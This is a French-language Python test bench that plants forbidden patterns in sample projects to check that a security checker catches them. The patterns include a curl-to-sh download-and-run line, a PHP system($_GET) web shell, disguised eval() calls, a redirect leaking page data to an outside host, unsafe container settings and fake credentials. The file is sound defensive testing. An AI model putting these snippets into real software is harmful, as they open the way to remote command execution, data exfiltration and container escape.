#!/usr/bin/env python3
"""Banc de cas piégés du socle de sûreté.

Chaque cas pose dans un projet ce que le contrôle doit refuser, sous une forme qui lui a déjà échappé ou qui pourrait
lui échapper : adresse rangée dans une constante, exemption sans raison, extension inconnue, autre encodage, ligne très
longue, dossier « vendor », réglage de conteneur dangereux… Un contournement signalé devient une ligne de ce fichier :
il ne revient pas.

    python3 autotest_surete.py

Bibliothèque standard seulement. Les valeurs sensibles des cas (numéro de sécurité sociale, jeton) sont calculées ou
assemblées à l'exécution : aucune n'est écrite en clair dans ce fichier.
"""

from __future__ import annotations

import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import zipfile

ICI = pathlib.Path(__file__).resolve().parent
CSP = ("<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline' data: blob:; "
       "connect-src 'none'; form-action 'self'; base-uri 'self'\">")
PAGE = ('<!doctype html><html lang="fr"><head><meta charset="utf-8">' + CSP
        + '<title>Essai</title></head><body><p>ok</p></body></html>\n')
HOTE = 'api.exterieur.org'
MAUVAIS = ("const motDePasse = 'Azerty-2026-Prod!';\nfunction calcul(x) { return eval(x); }\n"
           f"fetch('https://{HOTE}/v1/donnees');\n")
echecs: list[str] = []
compte = 0


def nir_a_cle_valide() -> str:
    """Un numéro de sécurité sociale inventé, dont la clé est juste : calculée ici, jamais écrite en clair."""
    corps = '1850578006084'
    return f'{corps[0]} {corps[1:3]} {corps[3:5]} {corps[5:7]} {corps[7:10]} {corps[10:13]} {97 - int(corps) % 97:02d}'


def jeton_factice() -> str:
    """Un jeton au format JWT, assemblé à l'exécution."""
    return '.'.join(('eyJhbGciOiJIUzI1NiJ9', 'eyJzdWIiOiIxMjM0NTY3ODkwIn0', 'c2lnbmF0dXJlZmFjdGljZQ'))


def lancer(script: str, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(ICI / script), *args], capture_output=True, text=True, timeout=300)


class Banc:
    """Un projet de référence par format ; chaque cas en modifie une copie et lance le contrôle."""

    def __init__(self, travail: pathlib.Path):
        self.travail, self.bases, self.numero = travail, {}, 0

    def base(self, forme: str) -> pathlib.Path:
        if forme not in self.bases:
            nom = 'base-' + forme.lower()
            options = ('--niveau', 'partage') if forme == 'A' else ()
            r = lancer('creer_projet.py', nom, '--format', forme, *options, '--dest', str(self.travail))
            if r.returncode != 0:
                raise RuntimeError(r.stdout + r.stderr)
            self.bases[forme] = self.travail / nom
        return self.bases[forme]

    def messages(self, forme: str, fichiers: dict, preparer=None) -> tuple[list[str], list[str]]:
        self.numero += 1
        projet = pathlib.Path(shutil.copytree(self.base(forme), self.travail / f'cas-{self.numero:03d}', symlinks=True))
        for relatif, contenu in fichiers.items():
            cible = projet / relatif
            cible.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(contenu, bytes):
                cible.write_bytes(contenu)
            else:
                cible.write_text(contenu, encoding='utf-8')
        if preparer:
            preparer(projet)
        options = ('--sans-paquet',) if forme == 'A' else ('--sans-paquet', '--brouillon', '--sans-tests')
        sortie = lancer(str(projet / 'build' / 'fabriquer.py'), str(projet), *options, '--date', '2026-11-17').stdout
        lignes = [ligne.strip() for ligne in sortie.splitlines()]
        return [x for x in lignes if x.startswith('✗')], [x for x in lignes if x.startswith('!')]

    def cas(self, attendu: str, libelle: str, mot: str, fichiers: dict, forme: str = 'A', preparer=None) -> None:
        """attendu : « refus » (erreur bloquante), « alerte », ou « accepte » (aucune erreur)."""
        global compte
        compte += 1
        erreurs, alertes = self.messages(forme, fichiers, preparer)
        if attendu == 'accepte':
            conforme = not erreurs
        else:
            conforme = any(mot.lower() in message.lower() for message in (erreurs if attendu == 'refus' else alertes))
        print(('  ✓ ' if conforme else '  ✗ ') + libelle)
        if not conforme:
            echecs.append(libelle)
            print('      vu : ' + ' | '.join(erreurs + alertes)[:400])


def modifier(relatif: str, avant: str, apres: str):
    def appliquer(projet: pathlib.Path) -> None:
        fichier = projet / relatif
        texte = fichier.read_text(encoding='utf-8')
        if avant not in texte:
            raise AssertionError(f'{relatif} : « {avant} » introuvable')
        fichier.write_text(texte.replace(avant, apres, 1), encoding='utf-8')
    return appliquer


def classeur_avec_nir(projet: pathlib.Path) -> None:
    (projet / 'tests' / 'donnees').mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(projet / 'tests' / 'donnees' / 'liste.xlsx', 'w') as archive:
        archive.writestr('xl/sharedStrings.xml', f'<sst><si><t>Dupont</t></si><si><t>{nir_a_cle_valide()}</t></si></sst>')


def essais_signales(banc: Banc) -> None:
    print('\n— Les trois défauts signalés sur la version 0.1.0')
    banc.cas('refus', 'une adresse rangée dans une constante est vue (JavaScript)', 'Adresse non déclarée',
             {'src/app.js': f"const API_URL = 'https://{HOTE}/v1/donnees';\nfetch(API_URL);\n"})
    banc.cas('refus', 'une adresse rangée dans une constante est vue (Python)', 'Adresse non déclarée',
             {'src/lire.py': f"from urllib.request import urlopen\n\nURL = 'https://{HOTE}/v1'\n\n\ndef lire():\n    return urlopen(URL).read()\n"})
    banc.cas('refus', '« nosec » sans raison ne lève pas un refus', 'Exemption sans raison',
             {'src/app.js': 'function calcul(x) { return eval(x); } // nosec\n'})
    banc.cas('refus', '« nosecret » sans raison ne lève pas un refus', 'Exemption sans raison',
             {'src/app.js': "const motDePasse = 'Azerty-2026-Prod!'; // nosecret\n"})
    banc.cas('alerte', 'une exemption motivée est acceptée, et signalée à la cellule', 'exemption(s) de contrôle',
             {'src/app.js': 'function calcul(x) { return eval(x); } // nosec : formule saisie par le référent, jamais importée\n'})
    for extension in ('.jsx', '.tsx', '.php', '.sql'):
        banc.cas('refus', f'un fichier {extension} est contrôlé comme les autres', 'Secret possible', {f'src/App{extension}': MAUVAIS})
    banc.cas('refus', 'un fichier .jsx est contrôlé : eval() y est refusé', 'eval()', {'src/App.jsx': MAUVAIS})
    cle = '-----BEGIN ' + 'PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n-----END ' + 'PRIVATE KEY-----\n'
    banc.cas('refus', 'une clé privée est refusée, quelle que soit son extension', 'jeton ou clé privée', {'src/cle.pem': cle})
    banc.cas('refus', 'une clé privée dans un fichier sans extension connue est refusée', 'jeton ou clé privée', {'src/acces.dat': cle})


def essais_lecture(banc: Banc) -> None:
    print('\n— Rien n\'échappe à la lecture')
    banc.cas('alerte', 'eval() dans une ligne très longue donne une alerte, pas un silence', 'Ligne très longue',
             {'src/app.js': 'var a=1;' * 300 + 'eval(x);\n'})
    banc.cas('refus', 'un dossier « vendor » est lu comme le reste', 'eval()', {'src/vendor/outil.js': 'function f(x){ return eval(x); }\n'})
    banc.cas('refus', 'un fichier en Latin-1 est lu', 'Secret possible', {'src/conf.js': "const motDePasse = 'Azerty-2026-Été!';\n".encode('latin-1')})
    banc.cas('refus', 'un fichier en UTF-16 est lu', 'eval()', {'src/app.js': 'function f(x){ return eval(x); }\n'.encode('utf-16')})
    banc.cas('refus', 'un fichier de code contenant des octets nuls est refusé', 'illisible comme du texte',
             {'src/app.js': b'// \x00\nfunction f(x){ return eval(x); }\n'})
    banc.cas('refus', 'des caractères cachés qui inversent l\'affichage sont refusés', 'inversent',
             {'src/app.js': "const acces = 'utilisateur\u202e // admin';\n"})
    banc.cas('refus', 'du code dans tests/ est contrôlé', 'eval', {'tests/test_x.py': "def test_x():\n    assert eval('1+1') == 2\n"})
    banc.cas('refus', 'un autre « build/fabriquer.py » n\'est pas ignoré', 'eval', {'src/build/fabriquer.py': 'def f(x):\n    return eval(x)\n'})
    banc.cas('refus', 'un magasin de clés est refusé', 'clé ou de secrets', {'src/acces.p12': b'\x30\x82\x00\x01binaire'})
    banc.cas('alerte', 'une archive livrée est signalée', 'Archive livrée', {'src/lot.zip': b'PK\x03\x04reste'})
    if hasattr(os, 'symlink'):
        banc.cas('refus', 'un lien symbolique vers l\'extérieur est refusé', 'Lien symbolique', {},
                 preparer=lambda projet: os.symlink(__file__, projet / 'src' / 'exterieur.txt'))


def essais_code(banc: Banc) -> None:
    print('\n— Code dangereux déguisé')
    banc.cas('refus', 'window.eval() est vu', 'eval()', {'src/app.js': 'function f(x){ return window.eval(x); }\n'})
    banc.cas('refus', '(0, eval)() est vu', 'eval()', {'src/app.js': 'function f(x){ return (0, eval)(x); }\n'})
    banc.cas('refus', "window['eval']() est vu", 'eval()', {'src/app.js': "function f(x){ return window['eval'](x); }\n"})
    banc.cas('refus', 'Function() avec un texte est vu', 'Function()', {'src/app.js': "const g = Function('return this')();\n"})
    banc.cas('refus', 'system() en PHP est vu', 'commande système', {'src/page.php': "<?php system($_GET['c']); ?>\n"})
    banc.cas('refus', 'un script téléchargé puis exécuté est vu', 'téléchargé puis exécuté',
             {'src/installer.sh': '#!/bin/sh\ncurl -s http://127.0.0.1/x.sh | sh\n'})


def essais_adresses(banc: Banc) -> None:
    print('\n— Adresses')
    banc.cas('refus', 'une adresse collée à l\'exécution est refusée', 'Adresse construite',
             {'src/app.js': "const h = 'x'; fetch('https://' + h + '/v1');\n"})
    banc.cas('refus', 'une adresse en gabarit ${…} est refusée', 'Adresse construite', {'src/app.js': 'const h = 1; fetch(`https://${h}.exterieur.org/v1`);\n'})
    banc.cas('refus', 'une adresse en f-string est refusée', 'Adresse construite',
             {'src/lire.py': "ADRESSE = 'x'\nCIBLE = f'https://{ADRESSE}/v1'\n"})
    banc.cas('refus', 'une image en « //hôte » est vue', 'Adresse non déclarée',
             {'src/index.html': PAGE.replace('<p>ok</p>', '<img src="//pisteur.exterieur.org/p.png" alt="">')})
    banc.cas('refus', 'une redirection vers « //hôte » est vue', 'Adresse non déclarée',
             {'src/app.js': "location.href = '//pisteur.exterieur.org/?d=' + document.title;\n"})
    banc.cas('refus', 'un WebSocket est vu', 'Adresse non déclarée', {'src/app.js': "const s = new WebSocket('wss://flux.exterieur.org/s');\n"})
    banc.cas('refus', 'une adresse dans une feuille de style est vue', 'Adresse non déclarée',
             {'src/style.css': '#entete { background: url(https://images.exterieur.org/a.png); }\n'})
    banc.cas('refus', 'une adresse dans un fichier de réglages est vue', 'Adresse non déclarée',
             {'src/reglages.json': '{"service": "https://api.exterieur.org/v2"}\n'})
    banc.cas('refus', 'une adresse dans le tutoriel est vue', 'Adresse non déclarée',
             {'docs/tutoriel.html': PAGE.replace('<p>ok</p>', f"<script>fetch('https://{HOTE}/x')</script>")})
    banc.cas('refus', 'un joker dans reseau-autorise.txt est refusé', 'pas un nom d\'hôte complet', {'reseau-autorise.txt': '*.exterieur.org pour tout\n'})
    banc.cas('refus', 'un domaine entier dans reseau-autorise.txt est refusé', 'pas un nom d\'hôte complet', {'reseau-autorise.txt': 'org tout le domaine\n'})
    banc.cas('refus', 'une page sans balise de sécurité est refusée', 'CSP) absente', {'src/index.html': PAGE.replace(CSP, '')})
    banc.cas('refus', 'une balise de sécurité trop large est refusée', 'CSP) trop large',
             {'src/index.html': PAGE.replace("connect-src 'none'", 'connect-src https:')})
    banc.cas('alerte', 'une balise de sécurité qui ne couvre pas les formulaires est signalée', 'form-action',
             {'src/index.html': PAGE.replace("; form-action 'self'; base-uri 'self'", '')})
    banc.cas('alerte', 'une balise de sécurité qui autorise eval() est signalée', 'unsafe-eval',
             {'src/index.html': PAGE.replace('data: blob:;', "data: blob: 'unsafe-eval';")})


def essais_secrets_et_donnees(banc: Banc) -> None:
    print('\n— Secrets et données de personnes')
    banc.cas('refus', 'un mot de passe nommé « MDP » est vu', 'Secret possible', {'src/conf.py': "MDP = 'Tr0ub4dor-2026'\n"})
    banc.cas('refus', 'un mot de passe écrit dans une adresse de base est vu', 'mot de passe écrit dans une adresse',
             {'src/conf.py': "BASE = 'postgresql://appli:Tr0ub4dor2026@127.0.0.1:5432/outil'\n"})
    banc.cas('refus', 'un jeton est vu', 'jeton', {'src/conf.js': f"const jeton = '{jeton_factice()}';\n"})
    banc.cas('refus', 'un vrai secret qui contient « votre » n\'est pas pris pour un exemple', 'Secret possible',
             {'src/conf.py': "PASSWORD = 'Secret-votre-2026'\n"})
    banc.cas('refus', 'un numéro de sécurité sociale dans un classeur est vu', 'sécurité sociale', {}, preparer=classeur_avec_nir)
    banc.cas('refus', 'un numéro de sécurité sociale dans un fichier d\'extension inconnue est vu', 'sécurité sociale',
             {'src/liste.dat': f'Dupont;{nir_a_cle_valide()}\n'})
    banc.cas('refus', 'un numéro de sécurité sociale dans data/ est vu', 'sécurité sociale', {'data/import.csv': f'Dupont;{nir_a_cle_valide()}\n'})


def essais_conteneur(banc: Banc) -> None:
    print('\n— Réglages de conteneur (format B)')
    compose = 'deploy/compose.yaml'
    cas = (
        ('« privileged » est refusé', modifier(compose, '    read_only: true', '    privileged: true\n    read_only: true'), 'privileged'),
        ('« network_mode: host » est refusé', modifier(compose, '    read_only: true', '    network_mode: host\n    read_only: true'), 'network_mode'),
        ('« pid: host » est refusé', modifier(compose, '    read_only: true', '    pid: host\n    read_only: true'), '« pid »'),
        ('la socket du moteur de conteneurs est refusée',
         modifier(compose, '      - ./data:/data', '      - ./data:/data\n      - /var/run/docker.sock:/var/run/docker.sock'), 'socket du moteur'),
        ('le montage de la racine du serveur est refusé', modifier(compose, '      - ./data:/data', '      - ./data:/data\n      - /:/hote'), 'dossier système'),
        ('« cap_add » est refusé', modifier(compose, '    cap_drop:', '    cap_add:\n      - SYS_ADMIN\n    cap_drop:'), 'cap_add'),
        ('« user: root » est refusé', modifier(compose, '    read_only: true', '    user: root\n    read_only: true'), 'user: root'),
        ('un port publié sur toutes les interfaces est refusé', modifier(compose, '"127.0.0.1:', '"'), '127.0.0.1'),
    )
    for libelle, preparer, mot in cas:
        banc.cas('refus', libelle, mot, {}, forme='B', preparer=preparer)


def essais_sans_fausse_alerte(banc: Banc) -> None:
    print('\n— Ce qui doit rester accepté')
    banc.cas('accepte', 'une page propre, un commentaire avec une adresse, un test « startsWith »', '',
             {'src/index.html': PAGE, 'src/app.js': "// voir https://developer.mozilla.org/fr/docs\nif (lien.startsWith('https://')) { ok(); }\n"})
    banc.cas('accepte', 'un dessin SVG et son espace de noms', '',
             {'src/logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>\n'})
    banc.cas('accepte', 'une adresse déclarée, dans le code et dans la balise de sécurité', '', {
        'reseau-autorise.txt': 'api.entreprise.data.gouv.fr annuaire des entreprises, lecture seule\n',
        'src/index.html': PAGE.replace("connect-src 'none'", 'connect-src https://api.entreprise.data.gouv.fr'),
        'src/app.js': "const API = 'https://api.entreprise.data.gouv.fr/v3';\nfetch(API);\n"})
    banc.cas('accepte', 'un numéro de sécurité sociale à clé fausse (exemple inventé)', '', {'src/liste.csv': 'Dupont;1 85 05 78 006 084 00\n'})


def main() -> int:
    with tempfile.TemporaryDirectory() as dossier:
        banc = Banc(pathlib.Path(dossier))
        essais_signales(banc)
        essais_lecture(banc)
        essais_code(banc)
        essais_adresses(banc)
        essais_secrets_et_donnees(banc)
        essais_conteneur(banc)
        essais_sans_fausse_alerte(banc)
    print(f'\n{compte - len(echecs)}/{compte} cas conformes')
    print('RÉSULTAT :', 'tout est bon' if not echecs else f'{len(echecs)} point(s) à corriger')
    return 0 if not echecs else 1


if __name__ == '__main__':
    sys.exit(main())
